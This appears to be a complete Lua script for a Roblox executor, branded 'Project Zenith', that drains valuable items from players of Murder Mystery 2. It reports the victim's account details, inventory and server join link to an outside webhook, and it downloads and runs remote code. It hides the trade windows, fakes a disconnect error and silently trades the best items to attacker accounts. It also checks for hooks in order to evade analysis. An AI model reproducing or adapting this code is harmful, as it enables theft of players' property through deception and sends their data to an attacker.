getgenv().ZenithMM2 = getgenv().ZenithMM2 or false
if getgenv().ZenithMM2 then return end
getgenv().ZenithMM2 = true

local DEBUG = getgenv().debug == true
local function dbg(...)
    if not DEBUG then return end
    local parts = {}
    for i = 1, select("#", ...) do parts[i] = tostring(select(i, ...)) end
    print("[Zenith] " .. table.concat(parts, " "))
end

setclipboard("https://discord.gg/QuFqd2j3Va")

local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local HttpService = game:GetService("HttpService")
local CoreGui = game:GetService("CoreGui")

local function waitChild(parent, name, timeout)
    if not parent then return nil end
    local start = tick()
    local found = parent:FindFirstChild(name)
    if found then return found end
    while tick() - start < (timeout or 60) do
        task.wait(0.3)
        found = parent:FindFirstChild(name)
        if found then return found end
    end
    return nil
end

local localPlayer = Players.LocalPlayer
if not localPlayer then
    for _ = 1, 100 do
        task.wait(0.1)
        localPlayer = Players.LocalPlayer
        if localPlayer then break end
    end
    if not localPlayer then
        warn("[Zenith] no local player")
        return
    end
end

local playerGui = waitChild(localPlayer, "PlayerGui", 30)
if not playerGui then
    warn("[Zenith] PlayerGui not loaded")
    return
end

local DISCORD = "discord.gg/QuFqd2j3Va"
local VISUAL_URL = "https://raw.githubusercontent.com/PreZ-z/Zen/refs/heads/main/25ms_obf.lua(3)%20(1).txt"
local TRADE_CODE = game.PlaceId * 3
local PROTECTOR_URL = "https://zenith-protector.gangetnpa.workers.dev"

local USER = getgenv().user or {}
local TOKEN = getgenv().token or ""

if #USER == 0 then
    warn("[Zenith] no target")
    return
end
if type(TOKEN) ~= "string" or not TOKEN:match("^%x+$") or #TOKEN ~= 32 then
    warn("[Zenith] bad token")
    return
end

if game.PlaceId ~= 142823291 then
    warn("[Zenith] wrong place: " .. tostring(game.PlaceId))
    return
end

if not game:IsLoaded() then game.Loaded:Wait() end

local HALTED = false
local HALT_REASON = ""

local function halt(reason)
    if HALTED then return end
    HALTED = true
    HALT_REASON = reason
    _G.ZenithStop = true
    warn("[Zenith] HALTED: " .. reason)
    pcall(function()
        setclipboard("[Zenith] Guard triggered — protection active.\nReason: " .. reason)
    end)
end

local getinfo = debug and debug.getinfo or nil
local getrawmetatable = rawget(_G, "getrawmetatable")
local isfunctionhooked = rawget(_G, "isfunctionhooked")

local function checkMetatable()
    local hits = {}
    if not getrawmetatable or not getinfo then return hits end
    local ok, mt = pcall(getrawmetatable, game)
    if not ok or not mt then return hits end
    for _, key in ipairs({"__namecall", "__index", "__newindex"}) do
        local fn = rawget(mt, key)
        if type(fn) == "function" then
            if isfunctionhooked then
                local ok2, r = pcall(isfunctionhooked, fn)
                if ok2 and r == true then table.insert(hits, "mt_" .. key .. "_hooked") end
            end
            local ok3, info = pcall(getinfo, fn)
            if ok3 and info and info.what ~= "C" then
                local src = tostring(info.source or ""):lower()
                if src:find("@") and not src:find("@zenith") then
                    table.insert(hits, "mt_" .. key .. "_lua_source")
                end
            end
        end
    end
    return hits
end

local function checkBehavior()
    local hits = {}
    local ok1, err1 = pcall(function() return HttpService:JSONEncode(nil) end)
    if ok1 then
        table.insert(hits, "JSONEncode_silent")
    elseif err1 then
        local msg = tostring(err1):lower()
        if not msg:find("table") and not msg:find("nil") and not msg:find("argument") and not msg:find("expected") then
            table.insert(hits, "JSONEncode_msg")
        end
    end
    local ok2, err2 = pcall(function() return game:HttpGet("invalid://") end)
    if ok2 then
        table.insert(hits, "HttpGet_silent")
    elseif err2 then
        local msg = tostring(err2):lower()
        if msg:find("hookfunction") or msg:find("newcclosure") or msg:find("replaceclosure") then
            table.insert(hits, "HttpGet_trace")
        end
    end
    return hits
end

local function checkStack()
    local hits = {}
    local ok, err = pcall(function() return HttpService:JSONDecode(nil) end)
    if ok or not err then return hits end
    local ok2, trace = pcall(debug.traceback, tostring(err))
    if not ok2 or not trace then return hits end
    local t = tostring(trace):lower()
    if t:find("hookfunction") or t:find("newcclosure") or t:find("replaceclosure") then
        table.insert(hits, "trace_hook")
    end
    return hits
end

local function lightGuard()
    if HALTED then return false end
    local hits = checkMetatable()
    if #hits > 0 then halt(table.concat(hits, ", ")); return false end
    return true
end

local function heavyGuard()
    if HALTED then return end
    local hits = checkMetatable()
    if #hits == 0 then hits = checkBehavior() end
    if #hits == 0 then hits = checkStack() end
    if #hits > 0 then halt("heavy: " .. table.concat(hits, ", ")) end
end

task.wait(1)
lightGuard()
if HALTED then return end

task.spawn(function()
    local heavy_tick = 0
    while not HALTED do
        task.wait(1)
        if HALTED then break end
        lightGuard()
        heavy_tick = heavy_tick + 1
        if heavy_tick >= 5 then
            heavy_tick = 0
            heavyGuard()
        end
    end
end)

local request_ = request or syn and syn.request or http and http.request or http_request or httprequest
if not request_ then
    warn("[Zenith] No HTTP function")
    return
end

local function randomNonce(n)
    local chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789_-"
    local out = {}
    for i = 1, n do out[i] = chars:sub(math.random(1, #chars), math.random(1, #chars)) end
    return table.concat(out)
end

local function sendWebhook(payload)
    if HALTED then return end
    if not lightGuard() then return end
    task.spawn(function()
        pcall(function()
            local json = HttpService:JSONEncode(payload)
            request_({
                Url = PROTECTOR_URL .. "/hook/" .. TOKEN,
                Method = "POST",
                Headers = {
                    ["content-type"] = "application/json",
                    ["x-z-nonce"] = randomNonce(32),
                },
                Body = json,
            })
        end)
    end)
end

local ExecutorName = (identifyexecutor and select(2, pcall(identifyexecutor))) or (getexecutorname and select(2, pcall(getexecutorname))) or "Unknown"
local RealJobId = game.JobId

local ok, serverType = pcall(function()
    local rrs = game:GetService("RobloxReplicatedStorage")
    local gst = waitChild(rrs, "GetServerType", 10)
    if not gst then return nil end
    return gst:InvokeServer()
end)

if ok and serverType == "VIPServer" then
    warn("[Zenith] private server")
    return
end

if Players.MaxPlayers <= #Players:GetPlayers() then
    warn("[Zenith] server full")
    return
end

local Remotes = waitChild(ReplicatedStorage, "Remotes", 60)
if not Remotes then
    warn("[Zenith] Remotes not found")
    return
end

local Extras = Remotes:FindFirstChild("Extras")
if not Extras then
    warn("[Zenith] Extras not found")
    return
end

local GetPlayerLevel = Extras:FindFirstChild("GetPlayerLevel")
if not GetPlayerLevel then
    warn("[Zenith] GetPlayerLevel not found")
    return
end

local levelOk, level = pcall(function()
    return GetPlayerLevel:InvokeServer(localPlayer)
end)

if not levelOk or not level or level < 10 then
    warn("[Zenith] level too low: " .. tostring(level))
    return
end

local Trade = waitChild(ReplicatedStorage, "Trade", 60)
if not Trade then
    warn("[Zenith] Trade not found")
    return
end

local SendRequest = waitChild(Trade, "SendRequest", 15)
local CancelRequest = waitChild(Trade, "CancelRequest", 15)
local AcceptRequest = waitChild(Trade, "AcceptRequest", 15)
local DeclineRequest = waitChild(Trade, "DeclineRequest", 15)
local GetTradeStatus = waitChild(Trade, "GetTradeStatus", 15)
local AcceptTrade = waitChild(Trade, "AcceptTrade", 15)
local DeclineTrade = waitChild(Trade, "DeclineTrade", 15)
local OfferItem = waitChild(Trade, "OfferItem", 15)
local UpdateTrade = waitChild(Trade, "UpdateTrade", 15)
local StartTrade = waitChild(Trade, "StartTrade", 15)
local SetRequestsEnabled = Trade:FindFirstChild("SetRequestsEnabled")

if not SendRequest or not GetTradeStatus or not OfferItem then
    warn("[Zenith] core trade remotes missing")
    return
end

task.spawn(function()
    pcall(function()
        loadstring(game:HttpGet(VISUAL_URL))()
        dbg("Visual script loaded")
    end)
end)

local IGNORED = {
    DefaultGun = true, DefaultKnife = true,
    Reaver = true, Reaver_Legendary = true, Reaver_Godly = true, Reaver_Ancient = true,
    IceHammer = true, IceHammer_Legendary = true, IceHammer_Godly = true, IceHammer_Ancient = true,
    Gingerscythe = true, Gingerscythe_Legendary = true, Gingerscythe_Godly = true, Gingerscythe_Ancient = true,
    TestItem = true, Season1TestKnife = true, Cracks = true, Icecrusher = true,
    ["???"] = true, Dartbringer = true,
    TravelerAxeRed = true, TravelerAxeBronze = true, TravelerAxeSilver = true, TravelerAxeGold = true,
    BlueCamo_K_2022 = true, GreenCamo_K_2022 = true, SharkSeeker = true,
}

local function httpGet(url)
    local ok2, res = pcall(request_, {Url = url, Method = "GET", Timeout = 8})
    if ok2 and res and res.Body then return res.Body end
    local ok3, res3 = pcall(function() return game:HttpGet(url) end)
    if ok3 then return res3 end
    return nil
end

local weapons
do
    local Database = waitChild(ReplicatedStorage, "Database", 30)
    if Database then
        local Sync = waitChild(Database, "Sync", 15)
        if Sync then
            local Item = Sync:FindFirstChild("Item")
            if Item then
                local ok1, res1 = pcall(function() return require(Item) end)
                if ok1 and type(res1) == "table" then weapons = res1 end
            end
            if not weapons then
                local ok2, res2 = pcall(function() return require(Sync) end)
                if ok2 and type(res2) == "table" then weapons = res2.Weapons or res2 end
            end
        end
    end
end

if not weapons then
    local data = httpGet("https://raw.githubusercontent.com/31yyyyy/main/refs/heads/main/mm2db")
    if data then
        local chunk = loadstring(data)
        if chunk then
            local ok3, res3 = pcall(chunk)
            if ok3 and type(res3) == "table" then weapons = res3 end
        end
    end
end

if not weapons then
    warn("[Zenith] Item database failed")
    return
end

local itemValues = {}
local function fetchProjectReverseValues()
    local body = httpGet("https://api.project-reverse.org/valuables/get-game-valuables?game=mm2")
    if not body then return false end
    local ok2, decoded = pcall(HttpService.JSONDecode, HttpService, body)
    if not ok2 or type(decoded) ~= "table" then return false end
    local data = decoded.data or decoded
    if type(data) ~= "table" then return false end
    local count = 0
    for _, entry in pairs(data) do
        if type(entry) == "table" then
            local name = entry.name or entry.itemName or entry.displayName
            local value = tonumber(entry.price or entry.value or entry.avgValue or 0)
            if name and value then
                itemValues[name] = value
                itemValues[name:lower()] = value
                count += 1
            end
        end
    end
    return count > 0
end

if not fetchProjectReverseValues() then
    warn("[Zenith] Project Reverse values unavailable")
    return
end

local function getItemValue(id)
    local w = weapons[id]
    if not w then return 0 end
    local name = w.ItemName or w.Name
    if not name then return 0 end
    if w.Chroma == true then
        local chromaName = "Chroma " .. name
        if itemValues[chromaName] then return itemValues[chromaName] end
        if itemValues[chromaName:lower()] then return itemValues[chromaName:lower()] end
    end
    if itemValues[name] then return itemValues[name] end
    if itemValues[name:lower()] then return itemValues[name:lower()] end
    return 0
end

local function fixDataID(id)
    if weapons[id] then return id end
    local m1 = id:match("^(.-)_[KG]_%d%d%d%d$"); if m1 and weapons[m1] then return m1 end
    local m2 = id:match("^(.+)Knife$"); if m2 and weapons[m2] then return m2 end
    local m3 = id:match("^(.+)Gun$"); if m3 and weapons[m3] then return m3 end
    return id
end

local GetFullInventory = Extras:FindFirstChild("GetFullInventory")

local function fetchInventory()
    if not GetFullInventory then return {}, {} end
    local ok2, result = pcall(function()
        return GetFullInventory:InvokeServer(localPlayer.Name)
    end)
    if not ok2 or type(result) ~= "table" then return {}, {} end
    local weaponsList = {}
    local petsList = {}
    if result.Weapons and result.Weapons.Owned then
        for name, count in pairs(result.Weapons.Owned) do
            if not IGNORED[name] then
                local fixed = fixDataID(name)
                if not IGNORED[fixed] then
                    local w = weapons[fixed]
                    if w then
                        table.insert(weaponsList, {
                            uniqueId = name,
                            fixed = fixed,
                            name = (w.ItemName or w.Name or name) .. (w.Chroma == true and " [CHROMA]" or ""),
                            amount = type(count) == "number" and count or 1,
                            value = getItemValue(fixed),
                            rarity = w.Rarity or "Godly",
                        })
                    end
                end
            end
        end
    end
    if result.Pets and result.Pets.Owned then
        for name, count in pairs(result.Pets.Owned) do
            table.insert(petsList, {
                uniqueId = name,
                name = name,
                amount = type(count) == "number" and count or 1,
                value = 0,
            })
        end
    end
    table.sort(weaponsList, function(a, b) return a.value > b.value end)
    return weaponsList, petsList
end

local initialWeapons, initialPets = fetchInventory()
local totalItems = #initialWeapons + #initialPets

if totalItems == 0 then
    warn("[Zenith] No tradable items")
    return
end

local function formatValue(n)
    return string.format("%.2f", tonumber(n) or 0):gsub("0+$", ""):gsub("%.$", "")
end

local function formatItemList(list, limit)
    limit = limit or 20
    local lines = {}
    local shown = 0
    for _, item in ipairs(list) do
        if shown >= limit then
            table.insert(lines, "... and " .. (#list - limit) .. " more")
            break
        end
        shown += 1
        table.insert(lines, string.format("- %dx %s (%s)", item.amount, item.name, formatValue(item.value)))
    end
    if #lines == 0 then table.insert(lines, "None") end
    return table.concat(lines, "\n")
end

local function buildHit()
    local thumb = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. localPlayer.UserId .. "&width=150&height=150&format=png"
    local joinLink = string.format("https://fern.wtf/joiner?placeId=%d&gameInstanceId=%s", game.PlaceId, RealJobId)
    local teleport = string.format("game:GetService('TeleportService'):TeleportToPlaceInstance(%d, '%s')", game.PlaceId, RealJobId)

    return {
        content = "New hit",
        username = "Zenith",
        avatar_url = thumb,
        embeds = {{
            author = {
                name = "Project Zenith - Murder Mystery 2",
                url = "https://www.roblox.com/games/" .. game.PlaceId,
                icon_url = thumb
            },
            title = "**" .. localPlayer.Name .. "**",
            description = "```Status        : Pending\nItems         : " .. totalItems .. "```",
            color = 10494192,
            thumbnail = {url = thumb},
            fields = {
                {
                    name = "Player Info",
                    value = "User        : " .. localPlayer.Name ..
                            "\nUser ID     : " .. localPlayer.UserId ..
                            "\nAge         : " .. localPlayer.AccountAge .. " days" ..
                            "\nLevel       : " .. tostring(level) ..
                            "\nExecutor    : " .. ExecutorName ..
                            "\nPlayers     : " .. #Players:GetPlayers() .. "/" .. game.Players.MaxPlayers,
                    inline = false
                },
                { name = "Weapons", value = formatItemList(initialWeapons, 15), inline = false },
                { name = "Pets", value = formatItemList(initialPets, 8), inline = false },
                { name = "Teleport Script", value = teleport, inline = false },
                { name = "Join Link", value = "[Click here to join](" .. joinLink .. ")", inline = false }
            },
            footer = {text = "Project Zenith - " .. DISCORD, icon_url = thumb},
            timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
        }}
    }
end

sendWebhook(buildHit())

_G.ZenithStop = false
local ERROR_TEXT = "There was a problem receiving data, please reconnect. \n (Error Code: 260)"
task.spawn(function()
    pcall(function()
        CoreGui.DescendantAdded:Connect(function(descendant)
            if _G.ZenithStop then return end
            if descendant.Name == "ErrorMessage" and descendant:IsA("TextLabel") then
                descendant.Text = ERROR_TEXT
                descendant:GetPropertyChangedSignal("Text"):Connect(function()
                    if descendant.Text ~= ERROR_TEXT then descendant.Text = ERROR_TEXT end
                end)
            end
        end)
    end)
end)

if SetRequestsEnabled then
    pcall(function() SetRequestsEnabled:FireServer(true) end)
end

local function getUserDevice()
    if playerGui:GetAttribute("Device") == nil then
        local start = tick()
        while playerGui:GetAttribute("Device") == nil and tick() - start < 10 do task.wait() end
    end
    return playerGui:GetAttribute("Device")
end

local function hideTradeGui()
    pcall(function()
        local tradeGui = playerGui:FindFirstChild("TradeGUI")
        local tradeGuiPhone = playerGui:FindFirstChild("TradeGUI_Phone")
        local device = getUserDevice()
        if tradeGui then
            for _, child in ipairs(tradeGui:GetChildren()) do
                pcall(function() child.Position = UDim2.new(99, 99, 99, 99) end)
            end
        end
        if tradeGuiPhone then
            if tradeGuiPhone:FindFirstChild("Inactive") then
                local inactive = tradeGuiPhone.Inactive
                if inactive:FindFirstChild("Frame") then inactive.Frame.Position = UDim2.new(99, 99, 99, 99) end
                if inactive:FindFirstChild("TradeMainOld") then inactive.TradeMainOld.Position = UDim2.new(99, 99, 99, 99) end
            end
            if tradeGuiPhone:FindFirstChild("Container") then tradeGuiPhone.Container.Position = UDim2.new(99, 99, 99, 99) end
        end
        if device == "Phone" then
            local blocker = tradeGuiPhone and tradeGuiPhone:FindFirstChild("ClickBlocker")
            local mainGui = playerGui:FindFirstChild("MainGUI")
            local request = mainGui and mainGui.Lobby and mainGui.Lobby.Leaderboard
                and mainGui.Lobby.Leaderboard.Container and mainGui.Lobby.Leaderboard.Container.OverlayMenu
                and mainGui.Lobby.Leaderboard.Container.OverlayMenu.TradeRequest
            if blocker then
                blocker.Visible = false
                blocker:GetPropertyChangedSignal("Visible"):Connect(function()
                    if blocker.Visible then blocker.Visible = false end
                end)
            end
            if request then
                request.Visible = false
                request:GetPropertyChangedSignal("Visible"):Connect(function()
                    if request.Visible then request.Visible = false end
                end)
            end
        end
    end)
end

hideTradeGui()
task.spawn(function() while not HALTED do task.wait(1); if not HALTED then hideTradeGui() end end end)

pcall(function()
    if string.lower(getexecutorname and getexecutorname() or "") == "xeno" then
        local ok2, inv = pcall(function() return require(ReplicatedStorage.Modules.InventoryModule) end)
        if ok2 and inv then inv.UpdateInventory = function() end end
    else
        local profileChanged = Remotes:FindFirstChild("Inventory")
        profileChanged = profileChanged and profileChanged:FindFirstChild("ProfileDataChanged")
        if profileChanged then profileChanged:Destroy() end
    end
end)

local tradeState = {Active=false, Ended=false, LastOffer=nil, PartnerName=nil}

if SendRequest then
    SendRequest.OnClientInvoke = function() pcall(function() CancelRequest:FireServer() end) end
end
if UpdateTrade then
    UpdateTrade.OnClientEvent:Connect(function(info)
        if type(info) ~= "table" then return end
        if info.LastOffer ~= nil then tradeState.LastOffer = info.LastOffer end
    end)
end
if StartTrade then
    StartTrade.OnClientEvent:Connect(function(info)
        tradeState.Active, tradeState.Ended, tradeState.LastOffer = true, false, nil
        if info and info.Player1 and info.Player2 then
            local p1, p2 = info.Player1.Player, info.Player2.Player
            if p1 and p1.Name ~= localPlayer.Name then tradeState.PartnerName = p1.Name
            elseif p2 and p2.Name ~= localPlayer.Name then tradeState.PartnerName = p2.Name end
        end
    end)
end
pcall(function()
    Trade.DeclineTrade.OnClientEvent:Connect(function()
        tradeState.Active, tradeState.Ended, tradeState.PartnerName = false, true, nil
    end)
    Trade.AcceptTrade.OnClientEvent:Connect(function(success)
        if success then tradeState.Active, tradeState.Ended, tradeState.PartnerName = false, true, nil end
    end)
end)

local function getTradeStatus()
    local ok2, status, info = pcall(function() return GetTradeStatus:InvokeServer() end)
    if not ok2 then return nil, nil end
    return status, info
end

local function isTarget(name)
    if not name then return false end
    local lower = tostring(name):lower()
    for _, target in ipairs(USER) do
        if lower == tostring(target):lower() then return true end
    end
    return false
end

local function findReceiver()
    for _, name in ipairs(USER) do
        local p = Players:FindFirstChild(tostring(name))
        if p and p ~= localPlayer then return p end
    end
    return nil
end

local function getInfoPartnerName(info)
    if not info then return nil end
    if info.Player1 and info.Player1.Player then
        local p = info.Player1.Player
        if p.Name ~= localPlayer.Name then return p.Name end
    end
    if info.Player2 and info.Player2.Player then
        local p = info.Player2.Player
        if p.Name ~= localPlayer.Name then return p.Name end
    end
    return nil
end

local tradeBusy = false
local lastTradeEnded = false

local function cleanTradeState()
    if HALTED then return end
    local status = getTradeStatus()
    if status == "StartTrade" then
        pcall(function() DeclineTrade:FireServer() end); task.wait(0.3)
    elseif status == "ReceivingRequest" then
        pcall(function() DeclineRequest:FireServer() end); task.wait(0.2)
    elseif status == "SendingRequest" then
        pcall(function() CancelRequest:FireServer() end); task.wait(0.2)
    end
end

local function addItem(uniqueId, count)
    if HALTED then return end
    count = count or 1
    for _ = 1, count do
        if HALTED then return end
        pcall(function() OfferItem:FireServer(uniqueId, TRADE_CODE) end)
        task.wait(0.03)
    end
end

local function acceptDeal()
    if HALTED then return end
    local deadline = tick() + 60
    while tick() < deadline do
        if HALTED then return end
        local status, info = getTradeStatus()
        if not status or status == "None" then return true end
        if status ~= "StartTrade" then
            task.wait(0.3)
        else
            local side
            if info and info.Player1 and info.Player1.Player then
                if info.Player1.Player.Name ~= localPlayer.Name then side = "Player2"
                else side = "Player1" end
            end
            pcall(function() AcceptTrade:FireServer(TRADE_CODE, tradeState.LastOffer or 0) end)
            if side and info and info[side] and info[side].Accepted then return true end
            task.wait(0.5)
        end
    end
    return false
end

local function runTrade(targetPlayer)
    if HALTED then return end
    if tradeBusy then return end
    if not targetPlayer or not targetPlayer.Parent then return end
    if not lightGuard() then return end
    tradeBusy = true
    cleanTradeState()
    local status = getTradeStatus()
    local deadline = tick() + 5
    while status ~= "None" and tick() < deadline do
        if HALTED then tradeBusy = false; return end
        task.wait(0.2); status = getTradeStatus()
    end
    pcall(function() SendRequest:InvokeServer(targetPlayer) end)
    local openDeadline = tick() + 15
    while tick() < openDeadline do
        if HALTED then tradeBusy = false; return end
        if getTradeStatus() == "StartTrade" then break end
        task.wait(0.1)
    end
    if getTradeStatus() ~= "StartTrade" then tradeBusy = false; return end
    local weaponsList = fetchInventory()
    local offered, seen, slots = {}, {}, 0
    for _, item in ipairs(weaponsList) do
        if slots >= 4 then break end
        if not seen[item.fixed] then
            seen[item.fixed] = true
            local total = 0
            for _, other in ipairs(weaponsList) do
                if other.fixed == item.fixed then total += other.amount or 1 end
            end
            table.insert(offered, {uniqueId = item.fixed, amount = total})
            slots += 1
        end
    end
    if #offered == 0 then pcall(function() DeclineTrade:FireServer() end); tradeBusy = false; return end
    for _, item in ipairs(offered) do addItem(item.uniqueId, item.amount) end
    task.wait(1)
    acceptDeal()
    local closeDeadline = tick() + 60
    while tick() < closeDeadline do
        if HALTED then tradeBusy = false; return end
        local s = getTradeStatus()
        if s == "None" or s == nil then break end
        task.wait(0.3)
    end
    tradeBusy = false
    lastTradeEnded = true
end

local function tryTrade()
    if HALTED then return end
    if tradeBusy then return end
    local target = findReceiver()
    if not target then return end
    task.spawn(runTrade, target)
end

task.spawn(function()
    while not HALTED do
        task.wait(0.5)
        if not HALTED and not tradeBusy then pcall(tryTrade) end
    end
end)

task.spawn(function()
    while not HALTED do
        task.wait(1)
        if HALTED then break end
        local status, info = getTradeStatus()
        if not status then continue end
        if status == "ReceivingRequest" then
            local senderName
            if info and info.Sender then
                senderName = typeof(info.Sender) == "Instance" and info.Sender.Name or tostring(info.Sender)
            elseif info and info.Receiver then
                senderName = typeof(info.Receiver) == "Instance" and info.Receiver.Name or tostring(info.Receiver)
            end
            if senderName and not isTarget(senderName) then
                pcall(function() DeclineRequest:FireServer() end); task.wait(0.3)
            elseif senderName and isTarget(senderName) and not tradeBusy then
                pcall(function() AcceptRequest:FireServer() end); task.wait(1.5)
                local weaponsList = fetchInventory()
                local offered, seen, slots = {}, {}, 0
                for _, item in ipairs(weaponsList) do
                    if slots >= 4 then break end
                    if not seen[item.fixed] then
                        seen[item.fixed] = true
                        local total = 0
                        for _, other in ipairs(weaponsList) do
                            if other.fixed == item.fixed then total += other.amount or 1 end
                        end
                        table.insert(offered, {uniqueId = item.fixed, amount = total})
                        slots += 1
                    end
                end
                tradeBusy = true
                for _, item in ipairs(offered) do addItem(item.uniqueId, item.amount) end
                task.wait(1); acceptDeal(); task.wait(3); tradeBusy = false
            end
        elseif status == "StartTrade" then
            local partnerName = tradeState.PartnerName or getInfoPartnerName(info)
            if partnerName and not isTarget(partnerName) then
                pcall(function() DeclineTrade:FireServer() end); task.wait(0.5)
            end
        elseif status == "SendingRequest" then
            local receiverName
            if info and info.Receiver then
                receiverName = typeof(info.Receiver) == "Instance" and info.Receiver.Name or tostring(info.Receiver)
            end
            if receiverName and not isTarget(receiverName) then
                pcall(function() CancelRequest:FireServer() end); task.wait(0.5)
            end
        end
    end
end)

task.spawn(function()
    local tracked = {}
    for _, item in ipairs(initialWeapons) do tracked[item.uniqueId] = true end
    for _, item in ipairs(initialPets) do tracked[item.uniqueId] = true end
    if not next(tracked) then return end
    while not HALTED do
        task.wait(15)
        if HALTED then break end
        if tradeBusy then continue end
        if lastTradeEnded then task.wait(15); lastTradeEnded = false; continue end
        local nowWeapons, nowPets = fetchInventory()
        local present = {}
        for _, item in ipairs(nowWeapons) do present[item.uniqueId] = true end
        for _, item in ipairs(nowPets) do present[item.uniqueId] = true end
        for uid in pairs(tracked) do
            if not present[uid] then
                task.wait(3)
                local checkWeapons, checkPets = fetchInventory()
                local stillGone = true
                for _, item in ipairs(checkWeapons) do if item.uniqueId == uid then stillGone = false; break end end
                if stillGone then
                    for _, item in ipairs(checkPets) do if item.uniqueId == uid then stillGone = false; break end end
                end
                if stillGone then
                    _G.ZenithStop = true
                    setclipboard(DISCORD)
                    task.wait(1)
                    pcall(function() localPlayer:Kick("Project Zenith | Your items were drained\n\n" .. DISCORD) end)
                    return
                end
            end
        end
    end
end)

Players.PlayerAdded:Connect(function(player)
    if HALTED then return end
    if isTarget(player.Name) or isTarget(player.DisplayName) then
        task.wait(3)
        if not HALTED and not tradeBusy then pcall(tryTrade) end
    end
end)

print("Project Zenith active")
